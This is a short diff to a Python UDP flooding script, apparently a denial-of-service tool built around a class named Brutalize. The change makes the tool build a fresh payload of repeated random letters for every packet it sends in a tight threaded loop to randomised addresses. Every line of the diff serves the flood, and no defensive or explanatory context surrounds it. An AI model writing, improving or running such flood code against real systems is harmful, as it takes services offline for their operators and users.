@@ -1,7 +1,7 @@
 from socket import socket, AF_INET, SOCK_DGRAM
 
 from threading import Thread
-from random import choices, randint
+from random import choices, randint, choice
 from time import time, sleep
 
 import sys
@@ -69,6 +69,7 @@ class Brutalize:
     def send(self):
         while self.on:
             try:
+                self.data = str.encode(choice(string.ascii_letters) * self.force)
                 self.client.sendto(self.data, self._randaddr())
                 self.sent += self.len
             except:
